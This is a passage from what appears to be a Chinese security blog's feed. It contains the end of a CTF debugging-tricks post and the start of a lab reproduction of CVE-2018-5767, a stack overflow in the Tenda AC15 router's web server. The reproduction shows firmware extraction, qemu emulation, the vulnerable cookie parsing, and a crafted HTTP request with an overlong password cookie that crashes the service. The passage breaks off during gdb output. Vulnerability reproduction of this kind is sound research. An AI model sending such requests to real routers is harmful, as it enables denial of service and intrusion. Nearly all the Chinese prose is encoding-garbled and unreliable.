src="https://kjimg10.360buyimg.com/ott/jfs/t1/185193/37/30162/4434/63c7ad55F0660ee0e/1543736411453741.png"></p><p>æ›´æ¢å‰ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/177648/14/31676/38386/63c7ad56Ff8f96af0/34a9c8de00276d1e.png" style="zoom:80%;" /><p>è£…è½½å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ–°ldå’Œlibcå‡ä½¿ç”¨ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="comment"># æ›´æ¢ld</span></span><br><span class="line"><span class="comment"># patchelf --set-interpreter /path/to/ld.so /path/to/binary</span></span><br><span class="line">patchelf --set-interpreter /home/anza/hgame/spfa/ld-2.31.so ./spfa</span><br><span class="line"><span class="comment"># æ›´æ¢libc</span></span><br><span class="line"><span class="comment"># patchelf --replace-needed originlibc newlibc /path/to/binary</span></span><br><span class="line">patchelf --replace-needed libc.so.6 /home/anza/hgame/spfa/libc-2.31.so ./spfa</span><br></pre></td></tr></table></figure><p>æ›´æ¢åï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/4230/21/20981/40404/63c7ad56F2f43d7dd/a51d37282b0c94d1.png" style="zoom:80%;" /><h2 id="glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc-ld-debug"><a href="#glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc-ld-debug" class="headerlink" title="glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc/ld/.debug"></a>glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc/ld/.debug</h2><p><code>patchelf</code>ä¿®æ”¹äº†<code>libc</code>å’Œ<code>ld</code>ï¼Œè€Œ<code>gdb</code>è°ƒè¯•æ—¶ä¼šå»å¯»æ‰¾<code>libc</code>ç›®å½•ä¸‹çš„<code>.debug</code>æ–‡ä»¶ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸€äº›<code>heap/bins</code>ä¹‹ç±»çš„å‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å»<code>glibc-all-in-one</code>ä¸­ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„<code>libc</code>åŠå…¶é™„å¸¦çš„<code>.debug</code>ã€‚</p><p>å®ç°æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥ç›®å½•ä¸‹<code>ctrl+h</code>ä¾¿èƒ½æ˜¾ç¤ºå‡ºéšè—æ–‡ä»¶<code>.debug</code>ï¼Œå°†<code>.debug</code>å¤åˆ¶åˆ°é¢˜ç›®çš„ç›®å½•ä¸‹ï¼Œ<code>gdb</code>è°ƒè¯•å‘½ä»¤å°±æ¢å¤äº†ã€‚</p><h2 id="gdbå¸¦åŸºå€è°ƒè¯•"><a href="#gdbå¸¦åŸºå€è°ƒè¯•" class="headerlink" title="gdbå¸¦åŸºå€è°ƒè¯•"></a>gdbå¸¦åŸºå€è°ƒè¯•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0xç›¸å¯¹åŸºå€åç§»)</span><br></pre></td></tr></table></figure><h2 id="å…³é—­Alarm"><a href="#å…³é—­Alarm" class="headerlink" title="å…³é—­Alarm"></a>å…³é—­Alarm</h2><p>å‘½ä»¤è¡Œå…³é—­æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./vuln</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">å…³äºä¸åŒç‰ˆæœ¬ glibc æ›´æ¢çš„ä¸€äº›é—®é¢˜</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ€»ç»“ä¸€äº›å¸¸ç”¨çš„æŠ€å·§ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="tricks" scheme="http://example.com/categories/ctf/tricks/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-5767å¤ç°</title>
    <link href="http://example.com/2023/01/18/CVE-2018-5767/"/>
    <id>http://example.com/2023/01/18/CVE-2018-5767/</id>
    <published>2023-01-18T12:29:07.000Z</published>
    <updated>2023-01-23T02:01:33.846Z</updated>
    
    <content type="html"><![CDATA[<p>è€ƒç ”æœŸé—´æƒ³å¤ç°çš„æ¼æ´ï¼Œç°åœ¨æŒ–å‡ºæ¥ç›˜ä¸€ä¸‹ã€‚</p><blockquote><p><a href="https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q">Tenda-AC15æ ˆæº¢å‡ºæ¼æ´(CVE-2018-5767)    by æ˜ŸæœŸäº”å®éªŒå®¤</a></p><p><a href="https://zhuanlan.zhihu.com/p/468018356">cve-2018-5767 è·¯ç”±å™¨æ ˆæº¢å‡ºæ¼æ´å¤ç°    by åˆå¤©ç½‘å®‰å®éªŒå®¤</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">CVE-2018-5767 å¤ç°åˆ†æ    by CataLpa</a></p></blockquote><span id="more"></span><h3 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 20.04</span><br><span class="line">IDA7.7</span><br><span class="line">GDBè°ƒè¯•å™¨</span><br><span class="line">Binwalkå›ºä»¶è§£åŒ…å·¥å…·</span><br><span class="line">è·¯ç”±å™¨å›ºä»¶ï¼šTenda AC15 15.03.1.16_multi</span><br></pre></td></tr></table></figure><p><a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">Tenda AC15 15.03.1.16_multiä¸‹è½½åœ°å€</a></p><p><a href="https://www.cnblogs.com/deerCode/p/12153248.html">sasquatchæŠ¥é”™é—®é¢˜è§£å†³</a></p><h3 id="å¤ç°å‡†å¤‡"><a href="#å¤ç°å‡†å¤‡" class="headerlink" title="å¤ç°å‡†å¤‡"></a>å¤ç°å‡†å¤‡</h3><ul><li><p>åˆ†ç¦»å›ºä»¶ç³»ç»Ÿ<code>binwalk -Me US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin</code>ï¼Œå¾—åˆ°æ‰«æä¿¡æ¯ã€‚</p></li><li><p>åˆ‡æ¢åˆ°<code>./~.extracted/squashfs-root</code>ï¼Œå¯ä»¥çœ‹åˆ°æå–å‡ºçš„æ–‡ä»¶ç³»ç»Ÿç›®å½•ï¼š</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  etc_ro  home  init  lib  mnt  proc  root  sbin  sys  tmp  usr  var  webroot  webroot_ro</span><br></pre></td></tr></table></figure><ul><li>åœ¨<code>/bin</code>ä¸‹çœ‹åˆ°äº†<code>busybox</code>æ–‡ä»¶ï¼Œä¾ç¨€è®°å¾—å“ªå¹´å›½èµ›æœ‰è§åˆ°è¿‡ï¼Œ<code>busybox</code>æ˜¯ä¸€ä¸ªé›†æˆäº†ä¸€ç™¾å¤šä¸ªå¸¸ç”¨Linuxå‘½ä»¤å’Œå·¥å…·çš„è½¯ä»¶ï¼Œåœ¨<code>åµŒå…¥å¼Linux</code>åº”ç”¨ä¸­ï¼Œ<code>busybox</code>åº”ç”¨éå¸¸å¹¿æ³›ï¼ŒåŒæ—¶å¤§å¤šæ•°<code>Linuxå‘è¡Œç‰ˆ</code>çš„å®‰è£…ç¨‹åºä¸­éƒ½å«æœ‰<code>busybox</code>ã€‚æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å…¶æ–‡ä»¶å¤´ä¿¡æ¯ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ readelf -h busybox </span><br><span class="line">ELF å¤´ï¼š</span><br><span class="line">  Magicï¼š   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  ç±»åˆ«:                              ELF32</span><br><span class="line">  æ•°æ®:                              2 è¡¥ç ï¼Œå°ç«¯åº (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI ç‰ˆæœ¬:                          0</span><br><span class="line">  ç±»å‹:                              EXEC (å¯æ‰§è¡Œæ–‡ä»¶)</span><br><span class="line">  ç³»ç»Ÿæ¶æ„:                          ARM</span><br><span class="line">  ç‰ˆæœ¬:                              0x1</span><br><span class="line">  å…¥å£ç‚¹åœ°å€ï¼š               0xbeec</span><br><span class="line">  ç¨‹åºå¤´èµ·ç‚¹ï¼š          52 (bytes into file)</span><br><span class="line">  Start of section headers:          366736 (bytes into file)</span><br><span class="line">  æ ‡å¿—ï¼š             0x5000002, Version5 EABI, &lt;unknown&gt;</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         7</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         24</span><br><span class="line">  Section header string table index: 23</span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬é‡‡ç”¨<code>qemu</code>é…åˆ<code>chroot</code>æ¥å¯åŠ¨<code>/bin/httpd</code>ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line"><span class="built_in">cp</span> /usr/bin/qemu-arm-static .</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨åå‘ç°ç¨‹åºä¸€ç›´å¡åœ¨<code> Welcome to ...</code>ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55814/9/22768/36236/63cb76a8F332e8710/76022a7a1563947d.png" style="zoom:80%;" /><ul><li>æŸ¥çœ‹æºç¨‹åºï¼Œå‘ç°æœ‰ä¸¤ä¸ªæ£€æŸ¥ï¼Œåœ¨<code>qemu</code>æ¨¡æ‹Ÿç¯å¢ƒä¸‹è¿æ¥ä¸åˆ°ç›¸å…³æœåŠ¡ï¼Œå› æ­¤<code>patch</code>æ‰ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/183742/15/31846/41397/63cb7716F4dcc06a7/efbc58270829d983.png" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check_networkï¼šæ£€æŸ¥ç½‘ç»œ</span><br><span class="line">ConnectCfmï¼šè¿æ¥æŸç§æœåŠ¡</span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨ä¿®æ”¹åçš„<code>httpd</code>ï¼Œå‡ºç°äº†æ–°é—®é¢˜ï¼Œ<code>ip</code>åœ°å€ä¸æ˜¯æœ¬åœ°çš„ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107512/5/34170/71762/63cb9cccF4863cd3a/252f16a530ff8205.png" style="zoom:80%;" /><ul><li>ç”±æ­¤éœ€è¦è‡ªè¡Œé…ç½®ç½‘æ¡¥<code>br0</code>åé‡æ–°æ‰§è¡Œï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/199991/3/31226/69926/63cba043Fc231d974/68a8d252030e3f18.png" style="zoom:80%;" /><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><ul><li>æ¼æ´ä½äº<code>R7WebsSecurityHandler</code>ä¸­ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/96405/27/36314/97172/63cba273Ff4595e2e/91d078e546898fe2.png" style="zoom:80%;" /><ul><li>å…ˆæ¥çœ‹çœ‹<code>sscanf</code>çš„ç”¨æ³•ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sscanf</span>(<span class="string">&quot;zhou456 hedf&quot;</span>, <span class="string">&quot;%[^ ]&quot;</span>, str); <span class="comment">//å–åˆ°æŒ‡å®šå­—ç¬¦ä¸ºæ­¢çš„å­—ç¬¦ä¸²,å–é‡åˆ°ç©ºæ ¼ä¸ºæ­¢å­—ç¬¦ä¸²    </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;str=%s\n&quot;</span>, str);  <span class="comment">//str=zhou456;</span></span><br></pre></td></tr></table></figure><p>å³å°†æºå­—ç¬¦ä¸²ä»¥ä¸€å®šå½¢å¼(æ­£åˆ™)è¯»å…¥åˆ°ç›®çš„å­—ç¬¦ä¸²ã€‚</p><ul><li><code>password</code>æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œå®ƒæ˜¯<code>http</code>è¯·æ±‚ä¸­<code>cookie</code>ä¸Šçš„ä¸€ä¸ªå­—æ®µï¼Œä¹Ÿæ˜¯ä¼ªä»£ç ä¸­çš„<code>v40</code>ï¼Œè€Œ<code>v33</code>æ•°ç»„åªæœ‰<code>128</code>å¤§å°ï¼Œ<code>sscanf(v40, &quot;%*[^=]=%[^;];*&quot;, v33);</code>å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</li><li>æˆ‘ä»¬æ£€æŸ¥ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œé™¤äº†æ ˆä¸å¯æ‰§è¡Œï¼Œå…¶ä»–ä¿æŠ¤å‡æœªå¼€å¯ï¼Œå®¹æ˜“æƒ³åˆ°<code>ROP</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><ul><li>é¦–å…ˆæˆ‘ä»¬è¦è¿›å…¥æ¼æ´å‡½æ•°ï¼Œåªéœ€è®¿é—®å¦‚<code>/goform/anza</code>å³å¯ç»•è¿‡åˆ¤æ–­ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/203214/22/30645/24831/63cba72aFf1c6c343/6015d1ce1354bafa.png" alt="img" style="zoom:80%;" /><ul><li>è®¿é—®<code>http://&lt; ip &gt;/goform/anza</code>ï¼Œç”¨ç«ç‹é…åˆ<code>burpsuite</code>æŠ“ä¸ªåŒ…ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>å¢åŠ <code>Cookie</code>å­—æ®µé€è¿‡å»ï¼Œå°è¯•ä½¿è¿›ç¨‹å´©æºƒï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><ul><li>æŸ¥çœ‹æœåŠ¡ç«¯ï¼Œå‘ç°ç¨‹åºå‡ºç°äº†æ®µé”™è¯¯ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/179852/7/31724/77375/63cba99fF355a5dc6/221b8aa6cd6408c2.png" style="zoom:80%;" /><ul><li>ä½¿ç”¨<code>gdb-multiarch</code>è°ƒè¯•ç¨‹åºï¼Œåœ¨æ­¤ä¹‹å‰ç°åœ¨å›ºå®šç«¯å£æ‰“å¼€ç¨‹åºï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>å¦å¼€ä¸€ä¸ªçª—å£è¿›è¡Œè°ƒè¯•ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> R0   0x0</span><br><span class="line"> R1   0xfffef87b â—‚â€” stmdbvs r2!, &#123;r1, r2, r3, r5, r8, sb, sl, fp, sp&#125; ^ /* 0x69622f2e; &#x27;./bin/httpd&#x27; */</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line"> R4   0x0</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0xd2000 â€”â–¸ 0xe520 â—‚â€” push   &#123;r3, lr&#125; /* 0xe92d4008 */</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x0</span><br><span class="line"> SP   0xfffef770 â—‚â€” 1</span><br><span class="line"> PC   0xff7e1930 (_start) â—‚â€” mov    r0, sp /* 0xe1a0000d; &#x27;\r&#x27; */</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º 0xff7e1930 &lt;_start&gt;       mov    r0, sp</span><br><span class="line">   0xff7e1934 &lt;_start+4&gt;     bl     #0xff7e4bb4                   &lt;0xff7e4bb4&gt;</span><br><span class="line"> </span><br><span class="line">   0xff7e1938 &lt;_start+8&gt;     mov    r6, r0</span><br><span class="line">   0xff7e193c &lt;_start+12&gt;    ldr    sl, [pc, #0x30]</span><br><span class="line">   0xff7e1940 &lt;_start+16&gt;    add    sl, pc, sl</span><br><span class="line">   0xff7e1944 &lt;_start+20&gt;    ldr    r4, [pc, #0x2c]</span><br><span class="line">   0xff7e1948 &lt;_start+24&gt;    ldr    r4, [sl, r4]</span><br><span class="line">   0xff7e194c &lt;_start+28&gt;    ldr    r1, [sp]</span><br><span class="line">   0xff7e1950 &lt;_start+32&gt;    sub   